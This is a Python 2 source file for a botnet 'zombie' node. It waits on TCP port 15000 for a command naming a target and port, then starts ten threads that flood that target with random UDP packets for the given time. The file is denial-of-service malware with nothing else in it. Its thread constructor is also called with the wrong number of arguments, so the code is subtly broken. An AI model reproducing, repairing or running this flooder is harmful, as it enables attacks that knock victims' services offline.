import SocketServer
import threading
import time
import socket
import random
import os

N = 10

class zombie(SocketServer.BaseRequestHandler):
    def handle(self):
        self.data = self.request.recv(1024).strip()
        timeout, target, port = self.data.split(" ")
        self.request.sendall("ACK")

        for i in xrange(N):
            attack = attackUDPFlood(timeout, target, port, i)
            attack.start()

class attackUDPFlood(threading.Thread):
    def __init__(self, timeout, target, port):
        threading.Thread.__init__(self)
        self.timeout = int(timeout)
        self.target = target
        self.port = int(port)

    def run(self):
        victim = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        MESSAGE = os.urandom(1024)

        start = time.time()
        while time.time() - start < self.timeout:
            victim.sendto(MESSAGE, (self.target, self.port))


if __name__ == '__main__':
    HOST = socket.gethostbyname(socket.gethostname())
    PORT = 15000

    server = SocketServer.TCPServer((HOST, PORT), zombie)
    server.serve_forever()
